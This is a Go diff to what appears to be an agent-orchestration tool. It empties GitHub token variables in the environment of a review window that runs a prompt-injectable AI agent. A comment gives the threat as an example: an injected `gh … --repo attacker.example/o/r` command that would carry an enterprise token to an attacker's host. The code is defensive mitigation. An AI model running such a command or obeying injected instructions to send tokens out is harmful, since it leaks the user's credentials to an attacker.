@@ -25,25 +25,52 @@ func GHTokenVarsToScrub(host string) []string {
 	return append([]string(nil), GHTokenEnvVars[:]...)
 }
 
-// pinReviewWindowEnv applies the gh host pin to a review window's environment
-// entries (`KEY=VALUE`, as tmux new-window -e takes them). On github.com it
-// returns env unchanged. On any other host it drops any GH_HOST or token
-// entry env already carries, then sets GH_HOST=host and every token variable
-// to empty. tmux new-window cannot unset a variable, and an empty value
-// overrides whatever the tmux server's environment held.
+// enterpriseTokenEnvVars are the GHTokenEnvVars gh sends only to a host other
+// than github.com (GHTokenEnvVars documents the split).
+var enterpriseTokenEnvVars = [2]string{"GH_ENTERPRISE_TOKEN", "GITHUB_ENTERPRISE_TOKEN"}
+
+// reviewWindowTokenVarsToEmpty returns the token variables a review window for
+// a PR on host must carry empty. It is GHTokenVarsToScrub plus one tightening
+// that holds for the window only: on github.com the enterprise pair is emptied
+// too. A github.com review never needs them, and they are exactly what a gh
+// call pointed at any other host would send. GH_TOKEN / GITHUB_TOKEN stay on
+// github.com, because gh there needs one of them (or hosts.yml) to read the PR.
+//
+// The tightening is not folded into GHTokenVarsToScrub, which githubauth's
+// pinned runner also applies: that runner's gh calls take no agent input, so
+// the window's reason for it does not carry over.
+func reviewWindowTokenVarsToEmpty(host string) []string {
+	scrub := GHTokenVarsToScrub(host)
+	if scrub == nil {
+		return append([]string(nil), enterpriseTokenEnvVars[:]...)
+	}
+	return scrub
+}
+
+// pinReviewWindowEnv applies the gh pin to a review window's environment
+// entries (`KEY=VALUE`, as tmux new-window -e takes them). It drops any entry
+// env already carries for a variable it sets, then sets every variable
+// reviewWindowTokenVarsToEmpty names to empty, and on a host other than
+// github.com also sets GH_HOST=host. tmux new-window cannot unset a variable,
+// and an empty value overrides whatever the tmux server's environment held;
+// gh treats an empty token variable as unset.
+//
+// On github.com GH_HOST is left alone. The allowed gh reads name
+// `--repo github.com/OWNER/REPO` explicitly, so GH_HOST does not choose their
+// host.
 //
 // The review window runs a prompt-injectable agent, so this is the window-side
 // half of forgectl#673: an ambient GH_ENTERPRISE_TOKEN in the window is what
 // a `gh … --repo attacker.example/o/r` would carry to another host. The
 // allow-list (allowlist.go) is the other half.
 func pinReviewWindowEnv(env []string, host string) []string {
-	scrub := GHTokenVarsToScrub(host)
-	if scrub == nil {
-		return env
+	empty := reviewWindowTokenVarsToEmpty(host)
+	pinHost := host != defaultGitHubHost
+	drop := make(map[string]bool, len(empty)+1)
+	if pinHost {
+		drop["GH_HOST"] = true
 	}
-	drop := make(map[string]bool, len(scrub)+1)
-	drop["GH_HOST"] = true
-	for _, k := range scrub {
+	for _, k := range empty {
 		drop[k] = true
 	}
 	pinned := make([]string, 0, len(env)+len(drop))
@@ -54,8 +81,10 @@ func pinReviewWindowEnv(env []string, host string) []string {
 		}
 		pinned = append(pinned, e)
 	}
-	pinned = append(pinned, "GH_HOST="+host)
-	for _, k := range scrub {
+	if pinHost {
+		pinned = append(pinned, "GH_HOST="+host)
+	}
+	for _, k := range empty {
 		pinned = append(pinned, k+"=")
 	}
 	return pinned
